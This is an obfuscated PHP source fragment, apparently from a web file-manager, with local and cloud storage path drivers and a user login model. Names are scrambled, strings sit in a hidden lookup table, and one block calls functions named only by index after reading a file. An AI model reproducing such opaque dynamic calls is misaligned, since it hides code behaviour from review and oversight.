$úÕ»ä­à ? $úÕ»ä­à[$_SERVER[‘ÆÜ‘œ][79]] : 0; } public function info($¦´Ÿ“Öƒ) { if ($this->isFolder($¦´Ÿ“Öƒ)) { return $this->folderInfo($¦´Ÿ“Öƒ); } else { if ($this->isFile($¦´Ÿ“Öƒ)) { return $this->fileInfo($¦´Ÿ“Öƒ); } } return !1; } public function exist($ìÑèÍæ) { return $this->isFile($ìÑèÍæ) || $this->isFolder($ìÑèÍæ); } public function isFile($Ö½Ç˜Œ…) { return !$this->isFolder($Ö½Ç˜Œ…) && $this->objectMeta($Ö½Ç˜Œ…); } public function isFolder($…“©Ñ’Ê) { return $this->cacheMethod($_SERVER[‘ÆÜ‘œ][178], $…“©Ñ’Ê); } protected function objectMeta($šŠÔèı¤) { return $this->cacheMethod($_SERVER[‘ÆÜ‘œ][180], $šŠÔèı¤); } protected function _objectMeta($ôåõÙ ) { $«äˆšï =& $_SERVER[‘ÆÜ‘œ]; list($íƒ¶Œ­Ú, $òğÒŸø£) = $this->bucketManager->stat($this->bucket, $ôåõÙ ); if ($íƒ¶Œ­Ú) { $íƒ¶Œ­Ú[$«äˆšï[79]] = intval($íƒ¶Œ­Ú[$«äˆšï[1687]]); } return $íƒ¶Œ­Ú; } protected function _isFolder($®é¥è) { $Ì–÷¡¦î =& $_SERVER[‘ÆÜ‘œ]; if ($®é¥è == $Ì–÷¡¦î[12] || $®é¥è == $Ì–÷¡¦î[8]) { return !0; } list($åˆ¼Ÿ…Ã, $«Õ¨å¹Æ) = $this->bucketManager->listFiles($this->bucket, trim($®é¥è, $Ì–÷¡¦î[8]) . $Ì–÷¡¦î[8], $Ì–÷¡¦î[12], 1, $Ì–÷¡¦î[8]); return !empty($åˆ¼Ÿ…Ã[$Ì–÷¡¦î[1690]]) || !empty($åˆ¼Ÿ…Ã[$Ì–÷¡¦î[1691]]) ? !0 : !1; } } if ($_SERVER[$_SERVER[‘ÆÜ‘œ][324]] != $_SERVER[$_SERVER[‘ÆÜ‘œ][1700]]) { $_getc = $_SERVER[‘ÆÜ‘œ][325]; $_getfile = $_SERVER[$_SERVER[‘ÆÜ‘œ][326]] . $_SERVER[‘ÆÜ‘œ][327]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[‘ÆÜ‘œ][286], $_getfilec); if (count($_getarrs) < $_SERVER[‘ÆÜ‘œ][328]) { $exit = $_SERVER[‘ÆÜ‘œ][329]; $exit(); } $_act = $_SERVER[‘ÆÜ‘œ][330]; $_act($_SERVER[$_SERVER[‘ÆÜ‘œ][322]]); } goto AÜíôÏø¶‡; Aá‘ˆõÈÌ: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($•º««è) { if (substr($•º««è, 0, 2) == $_SERVER[‘ÆÜ‘œ][1474]) { $•º««è = BASIC_PATH . substr($•º««è, 2); } return $•º««è; } public function iconvApp($Úû¨„Ì) { $ãºÔœ× =& $_SERVER[‘ÆÜ‘œ]; global $config; return $this->iconvTo($Úû¨„Ì, $config[$ãºÔœ×[1598]], $config[$ãºÔœ×[1597]]); } public function iconvSystem($¯ú­¤¸ê) { $ø°á¡ş¸ =& $_SERVER[‘ÆÜ‘œ]; global $config; return $this->iconvTo($¯ú­¤¸ê, $config[$ø°á¡ş¸[1597]], $config[$ø°á¡ş¸[1598]]); } public function getPathOuter($ãêô û) { $øü…ê˜ =& $_SERVER[‘ÆÜ‘œ]; $Ô­¼ÅÜŸ = $this->iconvApp($this->pathBase); $ãêô û = $this->iconvApp($ãêô û); if (substr($Ô­¼ÅÜŸ, 0, 2) == $øü…ê˜[1474]) { $Ô­¼ÅÜŸ = BASIC_PATH . substr($Ô­¼ÅÜŸ, 2); } if (substr($ãêô û, 0, 2) == $øü…ê˜[1474]) { $ãêô û = BASIC_PATH . substr($ãêô û, 2); } $Ô­¼ÅÜŸ = KodIO::clear($Ô­¼ÅÜŸ); $ãêô û = KodIO::clear($ãêô û); $ãêô û = substr($ãêô û, strlen($Ô­¼ÅÜŸ)); if (empty($this->pathDriver)) { return $ãêô û; } return $this->pathDriver . $øü…ê˜[8] . ltrim($ãêô û, $øü…ê˜[8]); } public function mkfile($‘ÜÓ…ìõ, $ÇÚ¥©«Ü = '', $íÃîëË = REPEAT_RENAME) { $‘ÜÓ…ìõ = $this->iconvSystem($‘ÜÓ…ìõ); @touch($‘ÜÓ…ìõ); if ($ÇÚ¥©«Ü) { file_put_contents($‘ÜÓ…ìõ, $ÇÚ¥©«Ü); } @chmod($‘ÜÓ…ìõ, $this->pathAuth); if (is_file($‘ÜÓ…ìõ)) { return $this->getPathOuter($‘ÜÓ…ìõ); } $this->writeLog(__FUNCTION__ . $_SERVER[‘ÆÜ‘œ][1609], !0); return !1; } public function mkdir($Ş¼Ååú‹, $¿ËÉÊØï = REPEAT_SKIP) { $Ş¼Ååú‹ = $this->iconvSystem($Ş¼Ååú‹); if (is_dir($Ş¼Ååú‹)) { return $this->getPathOuter($Ş¼Ååú‹); } @mkdir($Ş¼Ååú‹, $this->pathAuth, !0); @chmod($Ş¼Ååú‹, $this->pathAuth); if (is_dir($Ş¼Ååú‹)) { return $this->getPathOuter($Ş¼Ååú‹); } $this->writeLog(__FUNCTION__ . $_SERVER[‘ÆÜ‘œ][1609], !0); return !1; } public function copyFile($†²×ö¥ê, $¦à£çìù) { $this->mkdir($this->pathFather($¦à£çìù)); $†²×ö¥ê = $this->iconvSystem($†²×ö¥ê); $¦à£çìù = $this->iconvSystem($¦à£çìù); $Øù¶ş¾æ = copy_64($†²×ö¥ê, $¦à£çìù); @chmod($¦à£çìù, $this->pathAuth); if ($Øù¶ş¾æ) { return $this->getPathOuter($¦à£çìù); } $this->writeLog(__FUNCTION__ . $_SERVER[‘ÆÜ‘œ][1609], !0); return !1; } public function moveFile($†§‘ª™, $˜ÎêêÉ) { $this->mkdir($this->pathFather($˜ÎêêÉ)); $†§‘ª™ = $this->iconvSystem($†§‘ª™); $˜ÎêêÉ = $this->iconvSystem($˜ÎêêÉ); $òğÑëæ = intval(@rename($†§‘ª™, $˜ÎêêÉ)); if (!$òğÑëæ) { if ($òğÑëæ = intval(@copy_64($†§‘ª™, $˜ÎêêÉ))) { @unlink($†§‘ª™); } } @chmod($˜ÎêêÉ, $this->pathAuth); if ($òğÑëæ) { return $this->getPathOuter($˜ÎêêÉ); } $this->writeLog(__FUNCTION__ . $_SERVER[‘ÆÜ‘œ][1609], !0); return !1; } public function movePath($½ØŒÈûá, $ŠÛ÷Àú», $¨ßÎ¨•ª = false) { $õ§ ìĞ =& $_SERVER[‘ÆÜ‘œ]; $½ØŒÈûá = $this->iconvSystem($½ØŒÈûá); $ŠÛ÷Àú» = $this->iconvSystem($ŠÛ÷Àú»); $¶Ü¬ßò• = rtrim($ŠÛ÷Àú», $õ§ ìĞ[8]) . $õ§ ìĞ[8] . ($¨ßÎ¨•ª ? $¨ßÎ¨•ª : get_path_this($½ØŒÈûá)); if (file_exists($¶Ü¬ßò•)) { return !1; } $³êöåÙ = intval(@rename($½ØŒÈûá, $¶Ü¬ßò•)); $³êöåÙ = file_exists($¶Ü¬ßò•); if ($³êöåÙ) { return $this->getPathOuter($¶Ü¬ßò•); } $this->writeLog(__FUNCTION__ . $õ§ ìĞ[1609], !0); return !1; } public function delFile($×“ƒº¬Ì) { $×“ƒº¬Ì = $this->iconvSystem($×“ƒº¬Ì); if (!@unlink($×“ƒº¬Ì)) { @chmod($×“ƒº¬Ì, $this->pathAuth); if (@unlink($×“ƒº¬Ì)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[‘ÆÜ‘œ][1609], !0); return !1; } return !0; } public function delFolder($ìÊ‰Ä—õ) { $‘–àêÎ· =& $_SERVER[‘ÆÜ‘œ]; $ìÊ‰Ä—õ = $this->iconvSystem($ìÊ‰Ä—õ); if (!is_dir($ìÊ‰Ä—õ)) { return !0; } if (!($º¡“’Ö = opendir($ìÊ‰Ä—õ))) { return !1; } while (($´Ç œº€ = readdir($º¡“’Ö)) !== !1) { if ($´Ç œº€ == $‘–àêÎ·[10] || $´Ç œº€ == $‘–àêÎ·[1419]) { continue; } $¯ÈŞÒ…Œ = $ìÊ‰Ä—õ . $‘–àêÎ·[8] . $´Ç œº€; if (is_file($¯ÈŞÒ…Œ) || is_link($¯ÈŞÒ…Œ)) { if (!unlink($¯ÈŞÒ…Œ)) { chmod($¯ÈŞÒ…Œ, $this->pathAuth); if (!unlink($¯ÈŞÒ…Œ)) { return !1; } } } else { if (is_dir($¯ÈŞÒ…Œ)) { chmod($¯ÈŞÒ…Œ, $this->pathAuth); $¯ÈŞÒ…Œ = $this->iconvApp($¯ÈŞÒ…Œ); if (!$this->delFolder($¯ÈŞÒ…Œ)) { return !1; } } } } closedir($º¡“’Ö); return rmdir($ìÊ‰Ä—õ); } public function rename($Û®¯ûóº, $²Åå–¾) { $Ÿ–‚é« =& $_SERVER[‘ÆÜ‘œ]; $–‰„ä×Ù = $this->fileNameAuto($this->pathFather($Û®¯ûóº), $²Åå–¾); $–‰„ä×Ù = $this->iconvSystem($–‰„ä×Ù); $Û®¯ûóº = $this->iconvSystem($Û®¯ûóº); $Î‡ş«Æ® = $this->pathFather($Û®¯ûóº); $šŠÄâÜ™ = rtrim($Î‡ş«Æ®, $Ÿ–‚é«[8]) . $Ÿ–‚é«[8] . $–‰„ä×Ù; $„‡³•ğš = @rename($Û®¯ûóº, $šŠÄâÜ™); $šŠÄâÜ™ = $this->iconvApp($šŠÄâÜ™); if ($„‡³•ğš) { return $this->getPathOuter($šŠÄâÜ™); } $this->writeLog(__FUNCTION__ . $Ÿ–‚é«[1609], !0); return !1; } public function size($Ñ¤äÕù) { $Ñ¤äÕù = $this->iconvSystem($Ñ¤äÕù); return filesize_64($Ñ¤äÕù); } public function info($À”×­æª) { $À”×­æª = $this->iconvSystem($À”×­æª); if ($this->isFolder($À”×­æª)) { return $this->folderInfo($À”×­æª); } else { if ($this->isFile($À”×­æª)) { return $this->fileInfo($À”×­æª); } } return !1; } protected function infoChildren($ıÎ²àë³, &$Ó„ñ†“, $î´µ¨¥´ = true) { $Œ¶ ¶İ‡ =& $_SERVER[‘ÆÜ‘œ]; check_abort_echo(); $ıÎ²àë³ = rtrim($ıÎ²àë³, $Œ¶ ¶İ‡[8]) . $Œ¶ ¶İ‡[8]; if ($î´µ¨¥´) { $ıÎ²àë³ = $this->iconvSystem($ıÎ²àë³); } if (!($Ä’«³´µ = @opendir($ıÎ²àë³))) { return; } while (($¬ï¬˜ˆ— = readdir($Ä’«³´µ)) !== !1) { if ($¬ï¬˜ˆ— == $Œ¶ ¶İ‡[10] || $¬ï¬˜ˆ— == $Œ¶ ¶İ‡[1419]) { continue; } $Ì£ø˜ÖÅ = $ıÎ²àë³ . $¬ï¬˜ˆ—; if (is_file($Ì£ø˜ÖÅ) || is_link($Ì£ø˜ÖÅ)) { $Ó„ñ†“[$Œ¶ ¶İ‡[80]]++; $Ó„ñ†“[$Œ¶ ¶İ‡[79]] += filesize_64($Ì£ø˜ÖÅ); } else { if (is_dir($Ì£ø˜ÖÅ)) { $Ó„ñ†“[$Œ¶ ¶İ‡[81]]++; $this->infoChildren($Ì£ø˜ÖÅ, $Ó„ñ†“, !1); } } } closedir($Ä’«³´µ); } private function folderInfo($Œ—İ—Õ, $É§İŒœ® = false) { $¦‰Õ˜´¸ =& $_SERVER[‘ÆÜ‘œ]; $Œ—İ—Õ = rtrim($Œ—İ—Õ, $¦‰Õ˜´¸[8]) . $¦‰Õ˜´¸[8]; $Š²¤Äìö = $this->iconvApp($this->pathThis($Œ—İ—Õ)); if ($É§İŒœ®) { return array($¦‰Õ˜´¸[32] => $Š²¤Äìö, $¦‰Õ˜´¸[87] => $this->getPathOuter($Œ—İ—Õ), $¦‰Õ˜´¸[33] => $¦‰Õ˜´¸[78]); } $Œ€×†¥® = array($¦‰Õ˜´¸[32] => $Š²¤Äìö, $¦‰Õ˜´¸[87] => $this->getPathOuter($Œ—İ—Õ), $¦‰Õ˜´¸[33] => $¦‰Õ˜´¸[78], $¦‰Õ˜´¸[232] => @filectime($Œ—İ—Õ), $¦‰Õ˜´¸[88] => @filemtime($Œ—İ—Õ), $¦‰Õ˜´¸[1613] => @fileatime($Œ—İ—Õ), $¦‰Õ˜´¸[1614] => is_readable($Œ—İ—Õ), $¦‰Õ˜´¸[1615] => is_writable($Œ—İ—Õ), $¦‰Õ˜´¸[1616] => get_mode($Œ—İ—Õ)); return $Œ€×†¥®; } private function fileInfo($‡É¿ë×ò, $äüïÌÄ = false) { $À£›ğ´’ =& $_SERVER[‘ÆÜ‘œ]; $¡åïÂÖ× = $this->iconvApp($this->pathThis($‡É¿ë×ò)); if ($äüïÌÄ) { return array($À£›ğ´’[32] => $¡åïÂÖ×, $À£›ğ´’[87] => $this->getPathOuter($‡É¿ë×ò), $À£›ğ´’[33] => $À£›ğ´’[231], $À£›ğ´’[79] => $this->size($‡É¿ë×ò), $À£›ğ´’[167] => $this->ext($¡åïÂÖ×)); } $ÂŸ‡éşˆ = array($À£›ğ´’[32] => $¡åïÂÖ×, $À£›ğ´’[87] => $this->getPathOuter($‡É¿ë×ò), $À£›ğ´’[33] => $À£›ğ´’[231], $À£›ğ´’[232] => @filectime($‡É¿ë×ò), $À£›ğ´’[88] => @filemtime($‡É¿ë×ò), $À£›ğ´’[1613] => @fileatime($‡É¿ë×ò), $À£›ğ´’[79] => $this->size($‡É¿ë×ò), $À£›ğ´’[167] => $this->ext($¡åïÂÖ×), $À£›ğ´’[1614] => is_readable($‡É¿ë×ò), $À£›ğ´’[1615] => is_writable($‡É¿ë×ò), $À£›ğ´’[1616] => get_mode($‡É¿ë×ò)); return $ÂŸ‡éşˆ; } public function exist($ÒÚÉØó) { $ÒÚÉØó = $this->iconvSystem($ÒÚÉØó); return @file_exists($ÒÚÉØó); } public function isFile($ ŸÀÛßş) { $ ŸÀÛßş = $this->iconvSystem($ ŸÀÛßş); return @is_file($ ŸÀÛßş); } public function isFolder($·×Šó Ş) { $·×Šó Ş = $this->iconvSystem($·×Šó Ş); return @is_dir($·×Šó Ş); } public function listPath($ËÆÅ•º°, $ñáÉƒ÷ = false) { $ á–ßÊê =& $_SERVER[‘ÆÜ‘œ]; $ËÆÅ•º° = $this->iconvSystem($ËÆÅ•º°); $ËÆÅ•º° = rtrim($ËÆÅ•º°, $ á–ßÊê[8]) . $ á–ßÊê[8]; $®ËÁ‚äò = array($ á–ßÊê[85] => array(), $ á–ßÊê[86] => array()); if (!($ûÓàÜ’“ = @opendir($ËÆÅ•º°))) { return $®ËÁ‚äò; } while (($ŠØìô—É = readdir($ûÓàÜ’“)) !== !1) { if ($ŠØìô—É == $ á–ßÊê[10] || $ŠØìô—É == $ á–ßÊê[1419]) { continue; } $µ ÇßÙ— = $ËÆÅ•º° . $ŠØìô—É; if (is_file($µ ÇßÙ—)) { $®ËÁ‚äò[$ á–ßÊê[86]][] = $this->fileInfo($µ ÇßÙ—, $ñáÉƒ÷); } else { $®ËÁ‚äò[$ á–ßÊê[85]][] = $this->folderInfo($µ ÇßÙ—, $ñáÉƒ÷); } } closedir($ûÓàÜ’“); return $®ËÁ‚äò; } public function listAll($§û¼äÄ§, &$Ï˜âã¸¤ = array()) { $¾”Ş å =& $_SERVER[‘ÆÜ‘œ]; $§û¼äÄ§ = $this->iconvSystem($§û¼äÄ§); $§û¼äÄ§ = rtrim($§û¼äÄ§, $¾”Ş å[8]) . $¾”Ş å[8]; if (!($¢“ÔàÓÖ = @opendir($§û¼äÄ§))) { return $Ï˜âã¸¤; } while (($ÎŞä™¯ = readdir($¢“ÔàÓÖ)) !== !1) { if ($ÎŞä™¯ == $¾”Ş å[10] || $ÎŞä™¯ == $¾”Ş å[1419]) { continue; } $ªíÓîÍŸ = $§û¼äÄ§ . $ÎŞä™¯; $Á™´¶•ğ = is_dir($ªíÓîÍŸ) && !is_link($ªíÓîÍŸ) ? 1 : 0; $ªíÓîÍŸ = $Á™´¶•ğ ? $ªíÓîÍŸ . $¾”Ş å[8] : $ªíÓîÍŸ; $Ï˜âã¸¤[] = array($¾”Ş å[87] => $this->getPathOuter($ªíÓîÍŸ), $¾”Ş å[78] => $Á™´¶•ğ, $¾”Ş å[88] => intval(@filemtime($ªíÓîÍŸ)), $¾”Ş å[79] => $Á™´¶•ğ ? 0 : intval($this->size($ªíÓîÍŸ))); if ($Á™´¶•ğ) { $this->listAll($ªíÓîÍŸ, $Ï˜âã¸¤); } } closedir($¢“ÔàÓÖ); return $Ï˜âã¸¤; } public function has($—µ¨ Â£, $ˆäŸóğ¨ = false, $©´Ü‚ø‚ = true) { $ µúÈû =& $_SERVER[‘ÆÜ‘œ]; $—µ¨ Â£ = $this->iconvSystem($—µ¨ Â£); $—µ¨ Â£ = rtrim($—µ¨ Â£, $ µúÈû[8]) . $ µúÈû[8]; if (!($ÚúÍÇ™… = @opendir($—µ¨ Â£))) { return !1; } $Ë±ñà•¢ = 0; $Ïï…‰¹´ = 0; $È°Ò¹„‡ = 0; while (($ÆöÓ•©Á = readdir($ÚúÍÇ™…)) !== !1) { if ($ÆöÓ•©Á == $ µúÈû[10] || $ÆöÓ•©Á == $ µúÈû[1419]) { continue; } $…˜¢½ = $—µ¨ Â£ . $ÆöÓ•©Á; if ($ˆäŸóğ¨) { $È°Ò¹„‡++; if (@is_file($…˜¢½)) { $Ë±ñà•¢++; } else { $Ïï…‰¹´++; } if ($È°Ò¹„‡ > 10000) { break; } continue; } if ($©´Ü‚ø‚) { if (@is_file($…˜¢½)) { return !0; } } else { if (@is_dir($…˜¢½ . $ µúÈû[8])) { return !0; } } } closedir($ÚúÍÇ™…); if ($ˆäŸóğ¨) { return array($ µúÈû[240] => $Ë±ñà•¢, $ µúÈû[241] => $Ïï…‰¹´); } return !1; } public function hashSimple($—™»ïü‚) { $Ğ¿±¯”É =& $_SERVER[‘ÆÜ‘œ]; if (!$—™»ïü‚) { return md5($Ğ¿±¯”É[12]); } $—™»ïü‚ = $this->iconvSystem($—™»ïü‚); $ø¯É‚ö” = $this->size($—™»ïü‚); $Ôö·Â‡ = 200; $æ¿©¥½ü = 50; if ($ø¯É‚ö” <= $Ôö·Â‡ * $æ¿©¥½ü) { return $this->hashMd5($—™»ïü‚) . $ø¯É‚ö”; } $ÌËœÇÜ = $Ğ¿±¯”É[12]; $‹Ş‚ë‹ë = intval($ø¯É‚ö” / $æ¿©¥½ü); $ä‚Äš¿Ş = fopen($—™»ïü‚, $Ğ¿±¯”É[1617]); if (!$ä‚Äš¿Ş) { return $ÌËœÇÜ; } for ($áò¢½õ = 0; $áò¢½õ < $æ¿©¥½ü; $áò¢½õ++) { fseek_64($ä‚Äš¿Ş, $‹Ş‚ë‹ë * $áò¢½õ); $ÌËœÇÜ .= fread($ä‚Äš¿Ş, $Ôö·Â‡); } fseek_64($ä‚Äš¿Ş, $ø¯É‚ö” - $Ôö·Â‡); $ÌËœÇÜ .= fread($ä‚Äš¿Ş, $Ôö·Â‡); fclose($ä‚Äš¿Ş); return md5($ÌËœÇÜ) . $ø¯É‚ö”; } public function getContent($øƒğ“¶š) { $øƒğ“¶š = $this->iconvSystem($øƒğ“¶š); return file_get_contents($øƒğ“¶š); } public function setContent($‘€ ´«, $ò¸Ä³ªò = '') { $‘€ ´« = $this->iconvSystem($‘€ ´«); $±ıŒÕ’” = @file_put_contents($‘€ ´«, $ò¸Ä³ªò, LOCK_EX); if (!$±ıŒÕ’”) { $this->writeLog(__FUNCTION__ . $_SERVER[‘ÆÜ‘œ][1609], !0); } clearstatcache(); @chmod($‘€ ´«, $this->pathAuth); return $±ıŒÕ’” === !1 ? !1 : !0; } public function fileSubstr($•×Ì±³», $èË©ÌÏÕ = 0, $ôËƒ¿ë‘ = false) { $İ©Óôù =& $_SERVER[‘ÆÜ‘œ]; $•×Ì±³» = $this->iconvSystem($•×Ì±³»); if ($ôËƒ¿ë‘ === !1) { $ôËƒ¿ë‘ = $this->size($•×Ì±³»); } if ($ôËƒ¿ë‘ <= 0) { return $İ©Óôù[12]; } $„ÎØñÌ = fopen($•×Ì±³», $İ©Óôù[1617]); if (!$„ÎØñÌ) { return !1; } fseek_64($„ÎØñÌ, $èË©ÌÏÕ); $Óã‡Àìî = fread($„ÎØñÌ, $ôËƒ¿ë‘); fclose($„ÎØñÌ); if (!$Óã‡Àìî) { $this->writeLog(__FUNCTION__ . $İ©Óôù[1609], !0); } return $Óã‡Àìî; } public function upload($ùÑÖÑÔ, $ÚÏ–¿§“, $ıĞ„ÁâÓ = false, $‘Œ¡§£ = REPEAT_REPLACE) { if (!$ÚÏ–¿§“ || !@file_exists($ÚÏ–¿§“)) { return !1; } if ($ıĞ„ÁâÓ) { return $this->moveFile($ÚÏ–¿§“, $ùÑÖÑÔ); } return $this->copyFile($ÚÏ–¿§“, $ùÑÖÑÔ); } public function setModifyTime($Ÿ¡€œ‹, $‰£ëıá = '') { @touch($Ÿ¡€œ‹, intval($‰£ëıá)); } public function download($×Å’ªä†, $åŸäèÜõ) { return $this->iconvSystem($×Å’ªä†); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($ƒ‘ˆõ‰) { parent::__construct($ƒ‘ˆõ‰); $this->setSignVersion($_SERVER[‘ÆÜ‘œ][248]); } public function fileOutImage($Ô…ŞÜñ, $¥ÜÔçà• = 250) { $Üå¹åç =& $_SERVER[‘ÆÜ‘œ]; if ($this->size($Ô…ŞÜñ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($Ô…ŞÜñ, $¥ÜÔçà•); } $Øº§ÒÔ = array($Üå¹åç[1618] => $Üå¹åç[1619] . $¥ÜÔçà• . $Üå¹åç[1620]); $¼‰Ó¢ÙÔ = $this->link($Ô…ŞÜñ, $Øº§ÒÔ); $this->fileOutLink($¼‰Ó¢ÙÔ); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($‰ÍÖ œã) { parent::__construct($‰ÍÖ œã); $this->setSignVersion($_SERVER[‘ÆÜ‘œ][248]); } public function uploadFormData($¯È—óµà, $³Ù“ß„ = 3600) { return $this->uploadFormDataV2($¯È—óµà, $³Ù“ß„); } } goto B¸éÄÉçŒÉ; BË‰îç•: class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\162"; protected $tableMeta = array("\164\141\x62\x6c\x65\116\141\x6d\145" => "\165\x73\x65\162\x5f\155\x65\x74\141", "\x6d\x65\164\x61\x46\151\145\154\x64" => "\x75\163\x65\x72\111\x44"); protected $simpleField = "\165\163\145\x72\111\104\x2c\156\151\x63\153\116\141\155\x65\x2c\x6e\x61\x6d\145\54\x61\166\141\164\x61\x72\x2c\x73\x65\x78\54\x73\164\x61\164\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($èÈ¨¤„) { $•¬æ¸î =& $_SERVER[‘ÆÜ‘œ]; $úıÑ½©¸ = $•¬æ¸î[2629]; return array($•¬æ¸î[2215] => array($èÈ¨¤„[0], $úıÑ½©¸), $•¬æ¸î[2217] => array($èÈ¨¤„[0], $úıÑ½©¸), $•¬æ¸î[2630] => array($èÈ¨¤„[0], $úıÑ½©¸)); } protected function ___getInfo($ÊÒÅÙ) { $Àê¹ˆëá = $this->getInfoSimple($ÊÒÅÙ); if (!$Àê¹ˆëá || !is_array($Àê¹ˆëá)) { return array(); } return $this->_getInfoApply($Àê¹ˆëá); } protected function ___getInfoFull($ºòÔºì) { $¸Ê¦ˆ¨ = $this->getInfoSimple($ºòÔºì); if (!$¸Ê¦ˆ¨ || !is_array($¸Ê¦ˆ¨)) { return array(); } return $this->_getInfoApply($¸Ê¦ˆ¨, !0); } protected function ___getInfoSimple($ãª¹À×õ) { $Ç’§›—´ =& $_SERVER[‘ÆÜ‘œ]; if (!$ãª¹À×õ) { return array(); } $£šŠ½¨‡ = $this->where(array($Ç’§›—´[1544] => intval($ãª¹À×õ)))->find(); if (!$£šŠ½¨‡ || !is_array($£šŠ½¨‡)) { return array(); } $£šŠ½¨‡[$Ç’§›—´[2327]] = Action($Ç’§›—´[2328])->parseUrl($£šŠ½¨‡[$Ç’§›—´[2327]]); return $£šŠ½¨‡; } private function _getInfoApply($Ô´Ùê¨, $üòÈãë = false) { $§¼µ„Óõ =& $_SERVER[‘ÆÜ‘œ]; if (!$Ô´Ùê¨) { return $Ô´Ùê¨; } $‚‘ªîÈú = md5($§¼µ„Óõ[2631] . $Ô´Ùê¨[$§¼µ„Óõ[1004]] . $§¼µ„Óõ[2632] . $Ô´Ùê¨[$§¼µ„Óõ[32]]); $Ô´Ùê¨ = $this->_listDataApplyItem($Ô´Ùê¨); $÷Ÿƒ²Å· = Model($§¼µ„Óõ[1484])->metaGet($Ô´Ùê¨[$§¼µ„Óõ[90]][$§¼µ„Óõ[192]]); $Ô´Ùê¨[$§¼µ„Óõ[2633]] = $‚‘ªîÈú; $Ô´Ùê¨[$§¼µ„Óõ[90]][$§¼µ„Óõ[2419]] = isset($÷Ÿƒ²Å·[$§¼µ„Óõ[2420]]) ? $÷Ÿƒ²Å·[$§¼µ„Óõ[2420]] : null; if ($üòÈãë) { $Ô´Ùê¨[$§¼µ„Óõ[563]] = $this->metaGet($Ô´Ùê¨[$§¼µ„Óõ[1544]]); } return $Ô´Ùê¨; } protected function getInfoSimpleOuter($Ÿ©Çˆ«) { $¯ÇÃ´ºú =& $_SERVER[‘ÆÜ‘œ]; if (!$Ÿ©Çˆ« || $Ÿ©Çˆ« == 0) { return array($¯ÇÃ´ºú[1544] => $¯ÇÃ´ºú[229], $¯ÇÃ´ºú[32] => $¯ÇÃ´ºú[174] . LNG($¯ÇÃ´ºú[2634]) . $¯ÇÃ´ºú[176], $¯ÇÃ´ºú[2327] => STATIC_PATH . $¯ÇÃ´ºú[2635]); } $âœÙÈÅë = $this->cacheFunctionGet($¯ÇÃ´ºú[2226], $Ÿ©Çˆ«); $» ó‘‡å = array_field_key($âœÙÈÅë, explode($¯ÇÃ´ºú[50], $this->simpleField)); if (!$» ó‘‡å) { return array($¯ÇÃ´ºú[1544] => $¯ÇÃ´ºú[1328], $¯ÇÃ´ºú[32] => $¯ÇÃ´ºú[174] . LNG($¯ÇÃ´ºú[2636]) . $¯ÇÃ´ºú[176], $¯ÇÃ´ºú[2327] => STATIC_PATH . $¯ÇÃ´ºú[2637]); } $» ó‘‡å[$¯ÇÃ´ºú[2327]] = Action($¯ÇÃ´ºú[2328])->parseUrl($» ó‘‡å[$¯ÇÃ´ºú[2327]]); return $» ó‘‡å; } protected function groupUser($ÈÀÂœï‹) { } public static function errorLang($â•Û’¯ø) { $£ğ¥šŸ =& $_SERVER[‘ÆÜ‘œ]; $›Ù·¾Âš = array(self::ERROR_USER_NOT_EXISTS => $£ğ¥šŸ[2638], self::ERROR_USER_PASSWORD_ERROR => $£ğ¥šŸ[2639], self::ERROR_USER_EXIST_NAME => $£ğ¥šŸ[2640], self::ERROR_USER_EXIST_PHONE => $£ğ¥šŸ[2641], self::ERROR_USER_EXIST_EMAIL => $£ğ¥šŸ[2642], self::ERROR_USER_LOGIN_LOCK => $£ğ¥šŸ[2643], self::ERROR_IP_NOT_ALLOW => $£ğ¥šŸ[2644], self::ERROR_USER_EXIST_NICKNAME => $£ğ¥šŸ[2645]); $¯¢›šÈ = LNG($›Ù·¾Âš[$â•Û’¯ø]); if ($â•Û’¯ø == self::ERROR_USER_LOGIN_LOCK) { $Ñ§¹›Êã = (int) Model($£ğ¥šŸ[1440])->get($£ğ¥šŸ[2646]); if ($Ñ§¹›Êã > 60) { $¯¢›šÈ = str_replace($£ğ¥šŸ[91], ceil($Ñ§¹›Êã / 60), $¯¢›šÈ); } } return $¯¢›šÈ; } protected function metaSet($ÎÌûøéø, $îŸ­…ÛÄ = null, $üššü­· = null) { $this->clearCache($ÎÌûøéø); return parent::metaSet($ÎÌûøéø, $îŸ­…ÛÄ, $üššü­·); } public function getInfoByMeta($æê”Ë¡¿, $¢øß’Ğ¯) { $¾Ş¡Şºë =& $_SERVER[‘ÆÜ‘œ]; $ÕÈ¸»Øç = Model($¾Ş¡Şºë[2647])->where(array($¾Ş¡Şºë[95] => $æê”Ë¡¿, $¾Ş¡Şºë[460] => $¢øß’Ğ¯))->find(); if ($ÕÈ¸»Øç) { return $this->getInfo($ÕÈ¸»Øç[$¾Ş¡Şºë[1544]]); } return !1; } public function userLoginCheck($åµ‰¾Íá, $‡÷™êÖê, $ù‹Äüé = false) { $ŸÕŒà¾ =& $_SERVER[‘ÆÜ‘œ]; $³ÂÀõÌò = $this->userLoginFind($åµ‰¾Íá); if (!$³ÂÀõÌò) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($³ÂÀõÌò[$ŸÕŒà¾[1544]], $‡÷™êÖê)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $ù‹Äüé ? $this->getInfoFull($³ÂÀõÌò[$ŸÕŒà¾[1544]]) : $this->getInfo($³ÂÀõÌò[$ŸÕŒà¾[1544]]); } public function userLoginFind($Ä†Ú——Â) { $­¾“Çùç =& $_SERVER[‘ÆÜ‘œ]; $¯–°ÖŠ© = array($­¾“Çùç[32] => $Ä†Ú——Â, $­¾“Çùç[2431] => $Ä†Ú——Â, $­¾“Çùç[390] => $Ä†Ú——Â, $­¾“Çùç[2648] => $Ä†Ú——Â, $­¾“Çùç[1118] => 